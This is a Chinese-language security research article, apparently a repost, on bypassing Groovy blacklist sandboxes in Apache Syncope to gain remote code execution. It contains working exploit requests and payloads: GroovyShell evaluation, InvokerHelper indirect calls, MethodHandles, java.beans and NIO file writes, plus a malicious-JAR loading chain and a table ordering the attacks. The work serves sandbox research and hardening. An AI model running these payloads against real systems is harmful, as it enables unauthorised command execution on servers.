# Groovy 沙箱绕过技术分析-以Apache Syncope为例的多版本RCE绕过
> 来源：https://xz.aliyun.com/news/92835

## 0x01 前言

  
Groovy 是 Java 生态里最常见的内嵌脚本引擎之一。Jenkins 的 Pipeline（Script Security）、各类规则引擎、工作流引擎、身份管理产品，都允许用户提交 Groovy 脚本并在服务端执行。一旦某个入口把用户输入送进了 Groovy，脚本沙箱就是最后一道防线；而 Groovy 沙箱的实现普遍采用"AST 改写 + 方法签名黑名单"的方案，这套方案存在结构性的绕过面。  
  
本文以 Apache Syncope 的一个真实漏洞链为例，整理 Groovy 黑名单沙箱的三类绕过方式：解释器逃逸、运行时间接调用、反射与黑名单盲区。每种方式都会从沙箱的实现原理出发，说明绕过的切入点在哪、为什么能绕过，并给出在真实目标上的利用效果。  
  
案例本身的时间线如下：  
  

| 阶段 | Syncope 版本状态 | 防御措施 | 绕过方式 | 所属类别 |
| --- | --- | --- | --- | --- |
| 初始漏洞 | 4.1.1 | 无沙箱 | 直接调用 ProcessBuilder | — |
| 第一次绕过 | 4.1.2（SYNCOPE-1907） | 沙箱未覆盖连接器路径，黑名单缺约 100 条签名 | new GroovyShell().evaluate(...) | 解释器逃逸 |
| 第二次绕过 | 4.1.2 + #1418 | 三条 Groovy 路径全覆盖，黑名单对齐 | InvokerHelper 间接调用 | 间接调用逃逸 |
|  |  |  |  |  |

  

## 0x02 Groovy 沙箱原理分析

  
目前主流的 Groovy 黑名单沙箱（Syncope 使用的 groovy-sandbox，以及由它发展来的 Jenkins lib-groovy-sandbox）由三层组成。  
  

### 2.1 编译期：SandboxTransformer 的 AST 改写

  
`SandboxTransformer` 是一个 Groovy 编译定制器（`CompilationCustomizer`），在编译阶段遍历 AST，把脚本里的方法调用、构造器调用、属性访问等表达式改写为对 `Checker` 跳板类静态方法的调用。以这段脚本为例：  
  

```groovy
Runtime.getRuntime().exec("id")
```

经过改写后，实际编译产物的调用形式等价于：  
  

```groovy
def r = Checker.checkedStaticCall(Runtime.class, Runtime.class, "getRuntime")
Checker.checkedCall(r, callSite, "exec", "id")
```

方法调用变成 `Checker.checkedCall`，静态方法调用变成 `Checker.checkedStaticCall`，构造器调用变成 `Checker.preCheckedConstructorCall`。改写发生在编译期，所以只有"经过这个被定制的编译器编译"的脚本，其字节码里才会带上这些检查点。  
  

### 2.2 运行期：GroovyInterceptor 拦截链与黑名单

  
`Checker` 内部遍历当前注册的 `GroovyInterceptor` 链，把调用的接收者类、方法名、参数类型交给拦截器判断（以下为简化逻辑）：  
  

```java
public static Object checkedCall(Object receiver, Object[] callSite, String method, Object... args) {
    for (GroovyInterceptor i : GroovyInterceptor.chain()) {
        // 拦截器逐个审查，全部放行才真正调用
    }
    // 实际执行 receiver.method(args)
}
```

拦截器链通过 ThreadLocal 维护：宿主应用在执行不可信脚本前注册拦截器，执行完后注销。Syncope 的实现里，这个拦截器就是 `SandboxInterceptor`，它将调用拼成签名后与 `Blacklist` 比对，命中则抛出 `SecurityException`。黑名单条目的格式形如：  
  

```
new java.lang.ProcessBuilder java.lang.String[]
staticMethod java.lang.Runtime getRuntime
method java.lang.Runtime exec java.lang.String
new groovy.lang.GroovyShell
method groovy.lang.GroovyShell evaluate java.lang.String
staticMethod java.lang.invoke.MethodHandles publicLookup
```

`new` / `method` / `staticMethod` + 类名 + 方法名 + 参数类型，纯静态签名匹配。  
  

### 2.3 小结：防护依附的三个前提

  
把上面的机制拆开，可以看出这类沙箱的防护依附于三个前提：  
  
1 脚本经过我编译——安全性来自编译期织入的检查点，而不是运行环境本身；  
2 调用以 Groovy 语法直接书写——`SandboxTransformer` 只改写源码中直接出现的调用；  
3 签名查得到目标——黑名单匹配的是第一跳的静态签名。  
后面的三类绕过方式，分别打破这三个前提中的一个。  
  

## 0x03 案例背景：Apache Syncope 的 Groovy 入口

  
Apache Syncope 的连接器管理接口 `POST /syncope/rest/connectors/check` 接收一个完全由客户端控制的 `ConnInstanceTO`，直接实例化连接器并调用 `test()`：  
  

```java
// core/idm/logic/src/main/java/org/apache/syncope/core/logic/ConnectorLogic.java:244
public void check(final ConnInstanceTO connInstanceTO) {
    connectorManager.createConnector(binder.getConnInstance(connInstanceTO)).test();
}
```

内置的脚本化连接器 `RESTConnector`（`net.tirasa.connid.bundles.rest`）的配置项里包含 `testScript`、`createScript` 等脚本字段，`test()` 会把 `testScript` 交给 ConnId 框架的 `GroovyScriptExecutor` 执行。于是一个认证后的 HTTP 请求就等于一段服务端 Groovy 代码的执行入口（所需权限仅 `CONNECTOR_READ`）：  
  

```
ConnectorLogic.check()
  → ConnId ConnectorFacade
    → RESTConnector.test()
      → ScriptExecutorFactory.newInstance("GROOVY")
        → GroovyScriptExecutor 执行 testScript
```

4.1.1 时代这段代码没有任何防护，`testScript` 里直接 `new ProcessBuilder(["sh","-c","id"]).start()` 即可 RCE。当时的验证采用了三步利用链，顺带说明 bundles 目录动态加载缺乏完整性校验：第一步在 `testScript` 中解码 Base64 把恶意 ConnId bundle JAR 写入 `/opt/syncope/bundles/`，第二步调用 `connectors/reload` 让框架重新扫描目录加载该 JAR，第三步用恶意 bundle 的信息构造配置再次调用 `connectors/check`，其 `test()` 方法用原生 Java 执行命令并把输出拼进异常消息回显。  
  
第一步，写入恶意 JAR，响应回显写入文件的大小：  
  

![图片.png](https://i.im.ge/QQr0gpJ/p2m-2480473e7d.png)

  
  
第二步，触发 reload，新 JAR 被直接加载，无签名校验、无白名单：  
  

![图片.png](https://i.im.ge/QQr0b7x/p2m-73a500550a.png)

  
  
第三步，触发恶意连接器的 `test()`，`id` 执行成功，输出通过异常消息返回：  
  

![图片.png](https://i.im.ge/QQr0cCa/p2m-08536bf055.png)

  
  
官方随后在 4.1.2 引入了 0x02 所述的 Groovy 沙箱——但从这里开始，绕过才真正进入正题。  
  

## 0x04 绕过方式一：解释器逃逸

  
打破的前提：脚本经过我编译。  
  

### 4.1 思路

  
沙箱的检查点是编译期织入的，那么只要能在脚本里创建一个新的、使用默认配置的 Groovy 解释器，把真正的 payload 作为字符串交给它，内层代码就会在一个从未织入检查的环境中编译执行。这不是绕过检查，而是让检查的调用点根本不存在。  
  
Groovy 运行时里能满足"重新解释一段代码"的入口至少有四个：  
  

```groovy
// 1. GroovyShell
new groovy.lang.GroovyShell().evaluate('Runtime.getRuntime().exec("id")')

// 2. GroovyClassLoader
new groovy.lang.GroovyClassLoader().parseClass('class E { def run() { Runtime.getRuntime().exec("id") } }')

// 3. Eval（内部就是新建 GroovyShell）
groovy.util.Eval.me('Runtime.getRuntime().exec("id")')

// 4. JSR-223 脚本引擎
new javax.script.ScriptEngineManager().getEngineByName('groovy')
    .eval('Runtime.getRuntime().exec("id")')
```

这四个入口本身都是普通的类构造和方法调用，能否使用取决于它们是否被列进黑名单——这正是这类逃逸的适用条件。  
  

### 4.2 案例应用：Syncope 第一次绕过

  
4.1.2 的 SYNCOPE-1907 修复存在覆盖缺口：沙箱只在 Syncope 自身的 `ImplementationManager` 中注册生效，连接器脚本走的是 ConnId 框架（`connector-framework-internal-1.6.1.0.jar`）自己的 `GroovyScriptExecutor`，配套的是 ConnId 自带的一份黑名单。  
  
对比两份黑名单（Syncope 的 253 行 vs ConnId 的约 100 行），ConnId 侧缺失约 100 条签名，其中就包括全部 `GroovyShell` 构造器重载、`GroovyClassLoader`、`Eval`、`ScriptEngineManager`/`ScriptEngine.eval`。于是：  
  

```http
POST /syncope/rest/connectors/check HTTP/1.1
Host: 127.0.0.1:18080
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Content-Type: application/json

{
  "adminRealm": "/",
  "location": "file:/opt/syncope/bundles/",
  "bundleName": "net.tirasa.connid.bundles.rest",
  "connectorName": "net.tirasa.connid.bundles.rest.RESTConnector",
  "version": "1.1.1",
  "displayName": "sandbox-bypass",
  "conf": [
    { "schema": { "name": "baseAddress", "type": "java.lang.String" }, "values": [ "http://127.0.0.1:1" ] },
    { "schema": { "name": "scriptingLanguage", "type": "java.lang.String" }, "values": [ "GROOVY" ] },
    { "schema": { "name": "reloadScriptOnExecution", "type": "boolean" }, "values": [ true ] },
    {
      "schema": { "name": "testScript", "type": "java.lang.String" },
      "values": [
        "new groovy.lang.GroovyShell().evaluate('def p = Runtime.getRuntime().exec(\"id\"); p.waitFor(); throw new RuntimeException(\"RCE:\" + p.getInputStream().text)')"
      ]
    }
  ]
}
```

响应：  
  

```
HTTP/1.1 400 Bad Request

{"status":400,"type":"ConnectorException","elements":["RuntimeException: RCE:uid=100(syncope) gid=101(syncope) groups=101(syncope)\n"]}
```

`id` 执行成功。这里有个值得注意的细节：相比无沙箱时代的三步利用链（写 JAR → reload → 触发），绕过后的利用反而只需要一个请求、仅 `CONNECTOR_READ` 权限——修复不完整时，攻击成本比修复前还低。  
  

### 4.3 为什么能绕过

  
逐步分析外层脚本的执行：  
  
1 外层脚本由 `GroovyScriptExecutor` 编译，`new GroovyShell()` 这个调用点确实被改写为 `Checker.preCheckedConstructorCall`，会被拦截审查；  
2 拦截器得到的签名是 `new groovy.lang.GroovyShell`，ConnId 黑名单里没有这条，放行；  
3 脚本内自行创建的 `GroovyShell` 使用 Groovy 默认 `CompilerConfiguration`，不含 `SandboxTransformer`；  
4 `evaluate()` 的参数作为一段全新的源码被这个默认编译器编译，字节码中不存在任何 `Checker.checked*` 调用点；  
5 `SandboxInterceptor` 此时仍注册在线程上，但没有任何代码路径会触发它——拦截器不是被欺骗，而是从未被调用；  
6内层脚本在零拦截环境中执行。  
  

### 4.4 防御侧的对应修复

  
官方随后的 #1418 补全了这个面：三条 Groovy 执行路径共享同一份黑名单，`GroovyShell`、`GroovyClassLoader`、`Eval`、`ScriptEngine` 全部列入。这类逃逸从此在语法层没有入口——但也仅此而已，见下一节。  
  

## 0x05 绕过方式二：运行时间接调用逃逸

  
打破的前提：调用以 Groovy 语法直接书写。  
  

### 5.1 思路

  
`SandboxTransformer` 改写的是"源码中直接书写的方法调用"。拦截器拿到的签名永远只是第一跳：接收者类 + 被调用的方法名。它不会解析运行期参数去推导这次调用最终触达的目标。  
  
那么只要找到一个"接收目标信息作为参数、在 Java 层代为完成调用"的工具类，黑名单看到的就只是一个无害的签名，真实目标完全藏在参数里。Groovy 运行时自带这样的工具：`org.codehaus.groovy.runtime.InvokerHelper`。它是 Groovy 自身的方法调度核心，提供：  
  
● `invokeStaticMethod(Class sender, String method, Object[] args)` —— 调用任意静态方法  
● `invokeMethod(Object object, String method, Object args)` —— 调用任意实例方法  
● `invokeConstructorOf(Class klass, Object[] args)` —— 调用任意构造器  
● `getProperty(...)` / `setProperty(...)` —— 读写任意属性  
通用 payload：  
  

```groovy
def IH = org.codehaus.groovy.runtime.InvokerHelper
def r  = IH.invokeStaticMethod(java.lang.Runtime.class, 'getRuntime', null)
def p  = IH.invokeMethod(r, 'exec', 'id')
p.waitFor()
// 读取 p.inputStream 回显
```

### 5.2 案例应用：Syncope 第二次绕过

  
在包含 #1418 全部修复的版本（commit `2334436`，ConnId 升级为 `1.6.1.1-SNAPSHOT`、黑名单已对齐）上，`testScript` 换成上述 payload：  
  

```
"def IH=org.codehaus.groovy.runtime.InvokerHelper;def r=IH.invokeStaticMethod(java.lang.Runtime.class,'getRuntime',null);def p=IH.invokeMethod(r,'exec','id');p.waitFor();def baos=new java.io.ByteArrayOutputStream();p.getInputStream().transferTo(baos);throw new RuntimeException('RCE:'+new String(baos.toByteArray(),'UTF-8').trim())"
```

响应：  
  

![图片.png](https://i.im.ge/QQr0R2y/p2m-cf2c6a6e93.png)

  
  
在黑名单语法层已"无死角"的版本上，`id` 仍然执行成功。同一段 payload 放进 Flowable BPMN 的 groovy scriptTask（另一条经过沙箱的路径）同样成功，说明这不是单点遗漏。  
  

### 5.3 为什么能绕过

  
对比两条执行路径：  
  

```
直接调用：
  Runtime.getRuntime()
    → 改写为 Checker.checkedStaticCall(Runtime, "getRuntime")
    → 比对黑名单 → 已列入 → 抛 SecurityException，拦截

间接调用：
  InvokerHelper.invokeStaticMethod(Runtime.class, 'getRuntime', null)
    → 改写为 Checker.checkedStaticCall(InvokerHelper, "invokeStaticMethod")
    → 比对黑名单 → 签名为 InvokerHelper.invokeStaticMethod，未列入 → 放行
    → InvokerHelper 内部经 MetaClassImpl 走 java.lang.reflect.Method.invoke()
      完成 Runtime.getRuntime() 的真实派发
    → 该派发发生在 Java 层，不在 SandboxTransformer 的改写范围内 → 执行成功
```

两处关键：  
  
1 签名与目标分离。拦截器看到的是 `InvokerHelper.invokeStaticMethod`，真实目标 `Runtime.getRuntime` 是一个运行期字符串参数。黑名单做的是静态签名匹配，无法检查运行期参数来还原最终调用目标；  
2 派发下沉到 Java 层。`InvokerHelper` 内部通过 MetaClass 机制用 Java 反射完成调用，这个层面完全不受 Groovy AST 改写约束。  
更麻烦的是，`InvokerHelper` 无法被简单拉黑了事：它是 Groovy 运行时的基础设施，同类的间接派发路径还有 `MetaClassImpl`、`ScriptBytecodeAdapter`、`CallSite` 等，全部封锁会破坏 Groovy 自身的正常运行。所以这类绕过打中的不是某条黑名单条目的缺失，而是"黑名单只覆盖 Groovy 语法派发层"这一架构边界。  
  

## 0x06 绕过方式三：反射与黑名单盲区

  
打破的前提：签名查得到目标。  
  
除了 `InvokerHelper`，JDK 里还有一批"接收反射元信息、代为调用"的工具，它们与间接调用逃逸同理，但更依赖黑名单的覆盖度，可以单独归为一类。在 Syncope 案例的 ConnId 弱黑名单阶段（1.6.1.0），以下几条全部验证可行：  
  

```groovy
// MethodHandles：方法句柄反射
java.lang.invoke.MethodHandles.publicLookup()
    .findVirtual(Runtime.getRuntime().getClass(), 'exec',
        java.lang.invoke.MethodType.methodType(java.lang.Process.class, java.lang.String.class))
    .invoke(runtime, 'id')

// java.beans：表达式引擎，内部走反射
new java.beans.Expression(runtime, 'exec', ['id'] as Object[]).getValue()
new java.beans.Statement(runtime, 'exec', ['id'] as Object[]).execute()

// 任意文件写（无命令执行时的替代利用面）
def p = java.nio.file.Path.of('/opt/syncope/bundles/evil.jar')
java.nio.file.Files.write(p, payload)
```

这一类在黑名单对齐后（MethodHandles、beans、NIO 均已列入 Syncope 黑名单）就失去了入口。但把它单独列出来的原因是：实际攻防中它往往是第一优先级的尝试——拿到一个 Groovy 沙箱，先探测哪些常见危险类没被拉黑，成本最低；GroovyShell 逃逸和 InvokerHelper 逃逸是在黑名单覆盖充分时才需要动用的手段。  
  

## 0x07 绕过方式汇总

  

| 类别 | payload | 绕过原理 | 适用条件 |
| --- | --- | --- | --- |
| 解释器逃逸 | new GroovyShell().evaluate('...') | 内层代码由默认编译器编译，字节码中无检查点 | 黑名单未封 GroovyShell |
| 解释器逃逸 | new GroovyClassLoader().parseClass('...') | 同上 | 未封 GroovyClassLoader |
| 解释器逃逸 | groovy.util.Eval.me('...') | 同上（内部新建 GroovyShell） | 未封 Eval |
| 解释器逃逸 | new ScriptEngineManager().getEngineByName('groovy').eval('...') | JSR-223 独立入口，同上 | 未封 ScriptEngineManager/eval |
| 间接调用逃逸 | InvokerHelper.invokeStaticMethod(Runtime.class, 'getRuntime', null) | 目标藏在运行期参数，Java 层反射派发 | 未封 InvokerHelper |
| 间接调用逃逸 | InvokerHelper.invokeMethod(runtime, 'exec', 'id') | 同上 | 同上 |
| 间接调用逃逸 | InvokerHelper.invokeConstructorOf(ProcessBuilder.class, args) | 同上 | 同上 |
| 反射/盲区 | MethodHandles.publicLookup().findVirtual(...) | 反射派发不经语法层 | 未封 MethodHandles |
| 反射/盲区 | new java.beans.Expression(o, 'exec', args).getValue() | 表达式引擎内部反射 | 未封 java.beans |
| 反射/盲区 | Path.of(...) + Files.write(...) | 黑名单缺失 | 未封 NIO |
|  |  |  |  |

  
实际测试时建议自上而下按"盲区 → 解释器 → 间接调用"的顺序尝试，成本递增。  
  

## 0x08 黑名单沙箱的两个根本局限

  
回到 0x02 的三个前提，两次成功绕过分别打中了其中两个：  
  
1 编译期织入不等于运行期隔离。防护依赖"脚本被谁编译"，而不是"脚本跑在哪里"。只要能在沙箱内创建出一个默认配置的解释器，交给它的代码就在检查体系之外。这意味着任何基于 AST 改写的沙箱，都必须把"创建新解释器"的所有入口（`GroovyShell`、`GroovyClassLoader`、`Eval`、`ScriptEngineManager`，包括能间接构造它们的反射路径）一网打尽，缺一个就是全丢；  
2 语法层拦截不等于 Java 层拦截。防护依赖"调用以 Groovy 语法直接书写"。`InvokerHelper` 一类的运行时调度工具把目标转入运行期参数，在 Java 反射层完成派发，静态签名匹配在这条路径上是盲的。这个面理论上无法用黑名单闭合——间接派发是 Groovy 运行时自身的工作方式。  

## 0x09 总结

  
对研究者，拿到一个黑名单式 Groovy 沙箱时，依次回答三个问题就能定位绕过面：  
  
1 哪些危险类没被拉黑？（反射、NIO、beans——盲区探测）  
2 能不能在沙箱内创建新的解释器？（`GroovyShell`/`GroovyClassLoader`/`Eval`/`ScriptEngine`——解释器逃逸，检查点织入的缺失）  
3 黑名单拦在哪一层？（若只拦 Groovy 语法派发层，`InvokerHelper` 间接调用——签名与目标分离，Java 层派发）  
Apache Syncope 的案例完整覆盖了这三个问题的后两个：第一次绕过用 `GroovyShell` 打穿了"检查点织入"的边界，第二次绕过用 `InvokerHelper` 打穿了"拦截层次"的边界。三轮攻防下来，攻击成本始终维持在"一个 HTTP 请求"的水平——这也说明对内嵌脚本引擎而言，黑名单式的加固上限有限，入口治理和 JVM 层隔离才是根本。  
  
  
  

## 最后补充一下

  
嗯，当前版本已经更新到了4.1.3了，黑名单把本文中的所有类都关了，但是真的不存在绕过了吗？真的吗？真的吗？真的吗？
